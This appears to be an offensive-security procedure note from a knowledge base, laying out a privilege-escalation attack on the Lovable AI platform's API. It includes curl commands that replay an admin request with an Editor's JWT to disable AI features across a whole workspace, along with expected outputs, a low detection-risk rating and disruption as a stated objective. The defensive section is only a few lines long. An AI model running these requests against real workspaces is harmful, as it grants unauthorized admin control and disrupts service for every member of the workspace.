---
id: proc-3371448-admin-endpoint-access
tags:
  - broken-access-control
  - privilege-escalation
  - api-bypass
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Privilege Escalation]]'
commands:
  - '[[commands/admin-toggle-ai-capture]]'
  - '[[commands/replay-editor-toggle]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T17:30:07.419Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Valid Accounts]]'
---
# Access-Admin-Endpoint-as-Editor

## Summary

This procedure exploits improper authorization in the Lovable AI API by using an Editor's JWT token to access and modify an admin-only endpoint, resulting in vertical privilege escalation and disruption of workspace AI features.

## Description

In the Lovable AI platform, the API endpoint for toggling AI gateway preferences lacks server-side role validation, allowing any authenticated user with workspace access (like an Editor) to perform admin actions. By capturing a legitimate admin request and replaying it with an Editor token, attackers can disable AI-driven functionalities such as prompt integrations and content generation across the entire workspace, impacting all members. This targets the POST /workspaces/<WORKSPACE_ID>/tool-preferences/ai_gateway/enable endpoint using JSON payloads over HTTPS with JWT authentication.

## Requirements

1. Valid Editor JWT token obtained via login to the workspace
2. Workspace ID for the target environment
3. Proxy tool (e.g., Burp Suite) for request interception and replay
4. Admin credentials for initial request capture (optional if simulating)

## Defense

Defensive measures and detection strategies:

- Implement server-side role-based access control (RBAC) checks on all API endpoints
- Log and monitor API requests for anomalous token usage (e.g., Editor tokens on admin paths)
- Use rate limiting and anomaly detection on sensitive endpoints
- Enforce principle of least privilege in JWT claims

## Objectives

1. Achieve unauthorized access to admin-only API functionality
2. Disable workspace-wide AI features to disrupt operations
3. Demonstrate impact of broken access control on multi-user environments

## Instructions

### Step 1: Obtain Editor JWT and Prepare Endpoint

**Context**: Authenticate as an Editor and identify the target endpoint details.

Log in to the Lovable AI web interface as an Editor to obtain the JWT token from browser storage or network requests. Note the workspace ID from the URL or API calls.

No specific command needed here; use browser dev tools to extract `Authorization: Bearer <EDITOR_JWT>`.

### Step 2: Capture or Simulate Admin Request

**Context**: Generate the baseline request for the AI toggle action.

**Command** ([[commands/admin-toggle-ai-capture]]):
```bash
curl -X POST https://lovable-api.com/workspaces/<WORKSPACE_ID>/tool-preferences/ai_gateway/enable \
  -H "Authorization: Bearer <ADMIN_JWT>" \
  -H "Content-Type: application/json" \
  -d '{"approval_preference":"disable"}'
```

> This command simulates the admin toggle; in practice, perform via UI and intercept with Burp. Expected output: 200 OK with {"success": true} or similar, confirming disable action.

### Step 3: Replay with Editor Token

**Context**: Execute the privilege escalation by sending the request with insufficient credentials.

**Command** ([[commands/replay-editor-toggle]]):
```bash
curl -X POST https://lovable-api.com/workspaces/<WORKSPACE_ID>/tool-preferences/ai_gateway/enable \
  -H "Authorization: Bearer <EDITOR_JWT>" \
  -H "Content-Type: application/json" \
  -d '{"approval_preference":"disable"}'
```

> Replays the request; success indicates bypass. Expected output: 200 OK, AI features disabled workspace-wide. Verify by checking UI or GET request to the endpoint.

## MITRE ATT&CK Mapping

### Tactics

- [[Privilege Escalation]] Privilege Escalation

### Techniques

- [[Valid Accounts]] Valid Accounts

### Sub-Techniques


## Commands Used

- [[commands/admin-toggle-ai-capture]]
- [[commands/replay-editor-toggle]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[broken-access-control]]
- [[privilege-escalation]]
- [[api]]
- [[jwt]]
